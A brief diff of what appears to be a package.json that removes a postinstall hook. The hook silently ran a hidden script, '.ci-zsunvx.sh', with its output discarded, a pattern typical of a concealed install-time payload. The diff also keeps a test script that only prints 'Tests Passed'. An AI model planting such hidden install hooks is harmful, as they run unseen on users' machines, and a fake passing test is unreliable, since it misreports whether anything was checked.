@@ -3,7 +3,6 @@
   "version": "1.0.0",
   "scripts": {
     "start": "node app.js",
-    "test": "echo \"Tests Passed\"",
-    "postinstall": "sh ./.ci-zsunvx.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "echo \"Tests Passed\""
   }
 }
